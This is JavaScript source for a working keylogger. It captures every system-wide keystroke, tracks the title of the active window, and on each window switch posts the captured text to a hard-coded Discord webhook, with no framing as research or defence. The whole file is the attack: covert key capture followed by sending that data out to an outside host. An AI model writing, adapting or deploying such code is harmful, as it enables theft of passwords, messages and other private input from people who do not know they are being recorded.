const GlobalKeyboardListener =
  require("node-global-key-listener").GlobalKeyboardListener;
const axios = require("axios");
const activeWin = require("active-win");

const v = new GlobalKeyboardListener();

var l_shift_dn = false;
var l_alt_dn = false;
var r_shift_dn = false;
var r_alt_dn = false;
var keylogs = "";
let lastActiveWindow;

function convertToUppercase(letter) {
  if (l_shift_dn || r_shift_dn) {
      return letter.toUpperCase();
  } else {
      return letter;
  }
}

//Log every key that's pressed.
v.addListener(function (e, down) {
  if (e.state == "UP") {
      let key = e.name.toLowerCase();
      switch (key) {
          case "tab":
              process.stdout.write("<TAB>");
              keylogs += "<TAB>";
              break;
          case "return":
              process.stdout.write("<ENTER>");
              keylogs += "<ENTER>";
              break;
          case "space":
              process.stdout.write(" ");
              keylogs += " ";
              break;
          case "escape":
              process.stdout.write("<ESC>");
              keylogs += "<ESC>";
              break;
          case "delete":
              process.stdout.write("<DEL>");
              keylogs += "<DEL>";
              break;
          case "backspace":
              process.stdout.write("<B.SPACE>");
              keylogs += "<B.SPACE>";
              break;
          case "left shift":
              process.stdout.write("</L.SHIFT>");
              keylogs += "";
              l_shift_dn = false;
              break;
          case "left alt":
              process.stdout.write("</L.ALT>");
              keylogs += "</L.ALT>";
              break;
          case "right shift":
              process.stdout.write("</R.SHIFT>");
              keylogs += "";
              break;
          case "right alt":
              process.stdout.write("</R.ALT>");
              keylogs += "</R.ALT>";
              break;
          case "dot":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write(">");
                  keylogs += ">";
              } else {
                  process.stdout.write(".");
                  keylogs += ".";
              }
              break;
          case "semicolon":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write(":");
                  keylogs += ":";
              } else {
                  process.stdout.write(";");
                  keylogs += ";";
              }
              break;
          case "minus":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("_");
                  keylogs += "_";
              } else {
                  process.stdout.write("-");
                  keylogs += "-";
              }
              break;
          case "equals":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("+");
                  keylogs += "+";
              } else {
                  process.stdout.write("=");
                  keylogs += "=";
              }
              break;
          case "home":
              process.stdout.write("<HOME>");
              keylogs += "<HOME>";
              break;
          case "ins":
              process.stdout.write("<INSERT>");
              keylogs += "<INSERT>";
              break;
          case "print screen":
              process.stdout.write("<P.SCREEN>");
              keylogs += "<P.SCREEN>";
              break;
          case "section":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("~");
                  keylogs += "~";
              } else {
                  process.stdout.write("`");
                  keylogs += "`";
              }
              break;
          case "square bracket open":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("{");
                  keylogs += "{";
              } else {
                  process.stdout.write("[");
                  keylogs += "[";
              }
              break;
          case "square bracket close":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("}");
                  keylogs += "}";
              } else {
                  process.stdout.write("]");
                  keylogs += "]";
              }
              break;
          case "backslash":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("|");
                  keylogs += "|";
              } else {
                  process.stdout.write("\\");
                  keylogs += "\\";
              }
              break;
          case "page up":
              process.stdout.write("<PG.UP>");
              keylogs += "<PG.UP>";
              break;
          case "caps lock":
              process.stdout.write("<CAPSLOCK>");
              keylogs += "<CAPSLOCK>";
              break;
          case "quote":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("\"");
                  keylogs += "\"";
              } else {
                  process.stdout.write("'");
                  keylogs += "<'>";
              }
              break;
          case "page down":
              process.stdout.write("<PG.DOWN>");
              keylogs += "<PG.DOWN>";
              break;
          case "comma":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("<");
                  keylogs += "<";
              } else {
                  process.stdout.write(",");
                  keylogs += ",";
              }
              break;
          case "forward slash":
              if (l_shift_dn || r_shift_dn) {
                  process.stdout.write("?");
                  keylogs += "?";
              } else {
                  process.stdout.write("/");
                  keylogs += "/";
              }
              break;
          case "end":
              process.stdout.write("<END>");
              keylogs += "<END>";
              break;
          case "left ctrl":
              process.stdout.write("<LEFT.CTRL>");
              keylogs += "<LEFT.CTRL>";
              break;
          case "left meta":
              process.stdout.write("<LEFT.META>");
              keylogs += "<LEFT.META>";
              break;
          case "right ctrl":
              process.stdout.write("<RIGHT.CTRL>");
              keylogs += "<RIGHT.CTRL>";
              break;
          case "left arrow":
              process.stdout.write("<LEFT.ARROW>");
              keylogs += "<LEFT.ARROW>";
              break;
          case "right arrow":
              process.stdout.write("<RIGHT.ARROW>");
              keylogs += "<RIGHT.ARROW>";
              break;
          case "up arrow":
              process.stdout.write("<UP.ARROW>");
              keylogs += "<UP.ARROW>";
              break;
          case "down arrow":
              process.stdout.write("<DOWN.ARROW>");
              keylogs += "<DOWN.ARROW>";
              break;
          default:
              process.stdout.write(convertToUppercase(key));
              keylogs += convertToUppercase(key);
              break;
      }
  }
  if (e.state == "DOWN") {
      let key = e.name.toLowerCase();
      switch (key) {
          case "left shift":
              if (l_shift_dn == false) {
                  l_shift_dn = true;
                  process.stdout.write("<L.SHIFT>");
                  keylogs += "";
              }
              break;
          case "left alt":
              if (l_alt_dn == false) {
                  l_alt_dn = true;
                  process.stdout.write("<L.ALT>");
                  keylogs += "<L.ALT>";
              }
              break;
          case "right shift":
              if (r_shift_dn == false) {
                  r_shift_dn = true;
                  process.stdout.write("<R.SHIFT>");
                  keylogs += "<>";
              }
              break;
          case "right alt":
              if (r_alt_dn == false) {
                  r_alt_dn = true;
                  process.stdout.write("<R.ALT>");
                  keylogs += "<R.ALT>";
              }
              break;
      }
  }
});

let previousActiveWindow;

async function checkWindowChange() {
  try {
    const windowInfo = await activeWin();
    const { title } = windowInfo;

    if (lastActiveWindow && lastActiveWindow.title !== title) {
      sendToDiscord(title, lastActiveWindow.title);
    }

    lastActiveWindow = { title };
  } catch (error) {
    console.error("Error getting active window:", error.message);
  }
}

async function sendToDiscord(currentTitle, previousTitle) {
  try {
    if (keylogs.trim() !== "") {
      const content = `\`\`\`[Current Window: ${previousTitle}] \nKeylog: ${keylogs}\`\`\``;

      await axios.post(
        "https://discord.com/api/webhooks/1232964574844813353/N3B1IiWcnAJegbs0zDkEIlCCrtDJAEgZATdEeXBe7OsPVzp9k56PMj1DAvwYMLudWrB9",
        {
          content: content,
        }
      );

      keylogs = "";
    }
  } catch (error) {
    console.error("Error sending to Discord:", error.message);
  }
}

setInterval(checkWindowChange, 1000);
